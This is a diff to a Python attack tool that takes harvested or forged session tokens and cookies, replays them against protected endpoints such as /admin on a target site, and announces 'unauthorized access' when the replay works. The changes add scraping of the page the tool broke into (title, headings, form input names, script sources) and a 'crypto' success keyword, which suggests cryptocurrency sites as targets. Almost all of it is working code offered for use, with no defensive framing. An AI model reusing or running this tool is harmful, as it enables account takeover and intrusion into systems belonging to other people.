@@ -3,9 +3,11 @@
 LIVE LOGIN & SESSION VERIFIER MODULE
 - Intercepts and injects harvested/forged tokens or cookies on the fly
 - Executes live HTTP requests against protected routes
+- Parses structural HTML/DOM contents (titles, inputs, scripts) on successful bypass
 - Streams unredacted proof and visual status directly to the mobile terminal
 """
 import sys
+import re
 import httpx
 
 COLORS = {
@@ -22,9 +24,36 @@ def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
 
+def parse_admin_dom(html_content):
+    """Extracts key structural elements from the bypassed HTML page for proof."""
+    if not html_content:
+        return {"title": "None", "headings": [], "form_inputs": [], "scripts": []}
+        
+    # Extract page title
+    title_match = re.search(r"<title>(.*?)</title>", html_content, re.IGNORECASE)
+    title = title_match.group(1).strip() if title_match else "No Title Found"
+    
+    # Extract main headings (h1, h2, h3)
+    headings = re.findall(r"<h[1-3][^>]*>(.*?)</h[1-3]>", html_content, re.IGNORECASE | re.DOTALL)
+    clean_headings = [re.sub(r"<[^>]+>", "", h).strip() for h in headings if h.strip()]
+    
+    # Extract form inputs or names
+    inputs = re.findall(r"<input[^>]+name=[\"']([^\"']+)[\"']", html_content, re.IGNORECASE)
+    
+    # Extract script sources
+    scripts = re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", html_content, re.IGNORECASE)
+
+    return {
+        "title": title,
+        "headings": clean_headings[:5],  # top 5 headings
+        "form_inputs": list(set(inputs)),
+        "scripts": scripts[:5]
+    }
+
 def execute_live_login_verification(target_url, endpoint="/admin", token=None, cookie_dict=None):
     """
-    Actively injects tokens or cookies and hits a protected endpoint live on screen.
+    Actively injects tokens or cookies and hits a protected endpoint live on screen,
+    parsing the structural DOM if access is granted.
     """
     base = target_url.rstrip("/")
     full_url = f"{base}{endpoint}" if not endpoint.startswith("http") else endpoint
@@ -57,9 +86,18 @@ def execute_live_login_verification(target_url, endpoint="/admin", token=None, c
             terminal(f"  ├── Status Code : {COLORS['GREEN'] if status == 200 else COLORS['RED']}{status}{COLORS['RESET']}")
             terminal(f"  └── Content Len : {len(body)} bytes")
             
-            if status == 200 and ("dashboard" in body.lower() or "admin" in body.lower() or "welcome" in body.lower()):
-                terminal(f"\n{COLORS['RED']}{COLORS['BOLD']}[!!!] SUCCESS: UNATHORIZED ACCESS / LIVE LOGIN VERIFIED [!!!]{COLORS['RESET']}")
-                terminal(f"  └── Response Snippet:\n{COLORS['CYAN']}{body[:400]}...{COLORS['RESET']}\n")
+            if status == 200 and ("dashboard" in body.lower() or "admin" in body.lower() or "welcome" in body.lower() or "crypto" in body.lower()):
+                terminal(f"\n{COLORS['RED']}{COLORS['BOLD']}[!!!] SUCCESS: UNAUTHORIZED ACCESS / LIVE LOGIN VERIFIED [!!!]{COLORS['RESET']}")
+                
+                # Parse and display structural DOM proof
+                dom_data = parse_admin_dom(body)
+                terminal(f"\n{COLORS['GREEN']}[+] ADMIN DOM STRUCTURE EXTRACTED:{COLORS['RESET']}")
+                terminal(f"  ├── Page Title  : {COLORS['CYAN']}{dom_data['title']}{COLORS['RESET']}")
+                terminal(f"  ├── Headings    : {dom_data['headings']}")
+                terminal(f"  ├── Form Inputs : {dom_data['form_inputs']}")
+                terminal(f"  └── JS Bundles  : {dom_data['scripts']}")
+                
+                terminal(f"\n  └── Response Snippet:\n{COLORS['CYAN']}{body[:300]}...{COLORS['RESET']}\n")
                 return True
             else:
                 terminal(f"\n{COLORS['YELLOW']}[-] Server rejected session or redirected (Status: {status}).{COLORS['RESET']}")
